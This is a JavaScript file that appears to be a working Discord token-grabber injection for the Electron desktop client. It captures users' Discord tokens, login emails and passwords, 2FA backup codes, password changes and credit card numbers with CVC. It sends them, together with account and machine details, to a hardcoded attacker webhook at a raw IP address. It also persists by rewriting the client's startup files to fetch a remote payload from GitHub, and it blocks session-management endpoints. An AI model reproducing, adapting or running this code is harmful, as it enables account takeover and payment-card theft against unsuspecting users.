const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "http://217.114.43.194:144/injection",
    injection_url: "https://raw.githubusercontent.com/APT-Lucky/Injection/main/Injection.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Employee: {
            Value: 1,
            Emoji: "👨‍💼",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "🤝",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "🎉",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "🐞",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "🌟",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "🛡️",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "🤖",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "🦁",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "💡",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "⚖️",
            Rare: false,
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "💻",
            Rare: false,
        },
        Certified_Moderator: {
            Value: 262144,
            Emoji: "🔰",
            Rare: true,
        },
        Spammer: {
            Value: 1048704,
            Emoji: "⌨️",
            Rare: false,
        },
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const hooker = async (content, token, account) => {
    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);
    const billing = await getBilling(token);
    const friends = await getFriends(token);
    const servers = await getServers(token);

    const payload = {
        username: account.username,
        email: account.email,
        phone: account.phone || "None",
        token: token,
        nitro: nitro.replace(/[`]/g, ''),
        badges: badges.replace(/[`]/g, ''),
        billing: billing.replace(/[`]/g, ''),
        total_friends: friends.totalFriends,
        rare_friends: friends.message.replace(/\*\*|`/g, ''),
        total_servers: servers.totalGuilds,
        rare_servers: servers.message.replace(/\*\*|`/g, ''),
        hostname: os.hostname(),
        os_username: os.userInfo().username,
        avatar_url: `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`,
        action: content.action || "injected",
        type: "discord",
        id: 1
    };

    await request("POST", CONFIG.webhook, {
        "Content-Type": "application/json"
    }, JSON.stringify(payload));
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});
const fetchBilling = async token => await fetch("/billing/payment-sources", {
    "Authorization": token
});
const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});
const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

const getNitro = flags => {
    switch (flags) {
        case 1:
            return 'Nitro Classic';
        case 2:
            return 'Nitro Boost';
        case 3:
            return 'Nitro Basic';
        default:
            return 'None';
    }
};

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || 'None';
};

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
};

const getBilling = async token => {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '💳 ';
                    break;
                case 2:
                    billing += '💸 ';
                    break;
            }
        }
    });
    return billing || 'None';
};

const getFriends = async token => {
    const friends = await fetchFriends(token);

    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    });
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags);
        if (badges != "") {
            if (!rareUsers) rareUsers = "Rare Friends:\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "No Rare Friends";

    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);

    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `Rare Servers:\n`;
        }
        rareGuilds += `${guild.owner ? "👑 Owner" : "🛡️ Admin"} | Server Name: ${guild.name} - Members: ${guild.approximate_member_count}\n`;
    }

    rareGuilds = rareGuilds || "No Rare Servers";

    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token);

    const payload = {
        username: account.username,
        email: email,
        password: password,
        token: token,
        action: action
    };

    await hooker(payload, token, account);
};

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token);

    const filteredCodes = codes.filter((code) => {
        return code.consumed === false;
    });

    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }

    const payload = {
        username: account.username,
        email: account.email,
        phone: account.phone || "None",
        backup_codes: message,
        token: token,
        action: "viewed 2FA backup codes"
    };

    await hooker(payload, token, account);
};

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token);

    const payload = {
        username: account.username,
        new_password: newPassword,
        old_password: oldPassword,
        token: token,
        action: "changed password"
    };

    await hooker(payload, token, account);
};

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token);

    const payload = {
        username: account.username,
        email: account.email,
        credit_card_number: number,
        cvc: cvc,
        expiration: `${month}/${year}`,
        token: token,
        action: "added credit card"
    };

    await hooker(payload, token, account);
};

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token);

    const payload = {
        username: account.username,
        email: account.email,
        phone: account.phone || "None",
        token: token,
        action: "added paypal account"
    };

    await hooker(payload, token, account);
};

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));

        const token = await getToken();
        if (!token) return;

        const account = await fetchAccount(token);

        const payload = {
            username: account.username,
            email: account.email,
            phone: account.phone || "None",
            token: token,
            action: "injected"
        };

        await hooker(payload, token, account);
        clearAllUserData();
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0];
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                name: 'discord',
                main: 'index.js',
            }, null, 4),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size;
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  });
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CONFIG.webhook}');
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, 'app.asar')}');
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return;

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            await initiation();
            initiationCalled = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return; // 2FA
                }
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;

                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed email to " + requestData.email);
                }

                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow();
    });
};
createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    });
});

module.exports = require("./core.asar");

